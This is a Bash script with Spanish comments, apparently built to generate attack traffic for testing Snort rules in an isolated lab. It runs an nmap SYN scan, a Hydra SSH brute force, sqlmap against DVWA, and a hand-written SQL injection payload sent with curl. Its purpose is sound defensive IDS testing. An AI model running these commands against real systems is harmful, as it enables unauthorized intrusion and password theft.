#!/usr/bin/env bash
# ============================================================
#  run-attacks.sh  -  Generador de trafico de prueba para el IDS
#  Se ejecuta en la VM 'atacante' contra la VM 'victima' (10.10.10.20),
#  dentro de la red privada aislada del laboratorio. Sirve para
#  comprobar que Snort dispara las reglas de local.rules.
# ============================================================
set -u
VICTIM="${1:-10.10.10.20}"
LAB="$(dirname "$0")"

banner(){ echo; echo "=====> $1"; echo; }

menu(){
  cat <<EOF
============================================================
 Laboratorio IDS - pruebas contra ${VICTIM}
 (deja 'sudo snort-lab' corriendo en la VM ids en otra ventana)
============================================================
 1) Escaneo TCP SYN con Nmap        (regla SCAN  sid 1000001/1000002)
 2) Fuerza bruta SSH con Hydra      (regla SSH   sid 1000010/1000011)
 3) Inyeccion SQL con sqlmap        (regla SQLi  sid 1000020-1000023)
 4) SQLi manual con curl            (regla SQLi)
 5) Ping (prueba de humo)           (regla ICMP  sid 1000030)
 6) Ejecutar TODO en secuencia
 0) Salir
============================================================
EOF
}

scan(){
  banner "Nmap SYN scan -> ${VICTIM}"
  sudo nmap -sS -T4 -p 1-1000 "${VICTIM}"
}

brute(){
  banner "Hydra SSH -> ${VICTIM} (usuario labuser, lista corta)"
  hydra -l labuser -P "${LAB}/pass.txt" -t 4 -V "ssh://${VICTIM}"
}

sqli_sqlmap(){
  banner "sqlmap -> DVWA en ${VICTIM}"
  read -rp "Pega tu PHPSESSID de DVWA: " SID
  sqlmap -u "http://${VICTIM}/vulnerabilities/sqli/?id=1&Submit=Submit" \
         --cookie="PHPSESSID=${SID}; security=low" --batch --dbs
}

sqli_curl(){
  banner "SQLi manual con curl -> DVWA en ${VICTIM}"
  read -rp "Pega tu PHPSESSID de DVWA: " SID
  curl -s -b "PHPSESSID=${SID}; security=low" \
    "http://${VICTIM}/vulnerabilities/sqli/?id=1'+OR+'1'='1+union+select+1,2--+-&Submit=Submit" | head
}

ping_test(){
  banner "Ping -> ${VICTIM}"
  ping -c 4 "${VICTIM}"
}

if [ "${1:-menu}" = "all" ] || [ "${2:-}" = "all" ]; then
  ping_test; scan; brute
  echo "Para la SQLi necesitas el PHPSESSID; ejecuta la opcion 3 o 4 a mano."
  exit 0
fi

while true; do
  menu
  read -rp "Opcion: " opt
  case "$opt" in
    1) scan ;;
    2) brute ;;
    3) sqli_sqlmap ;;
    4) sqli_curl ;;
    5) ping_test ;;
    6) ping_test; scan; brute ;;
    0) exit 0 ;;
    *) echo "Opcion invalida" ;;
  esac
done
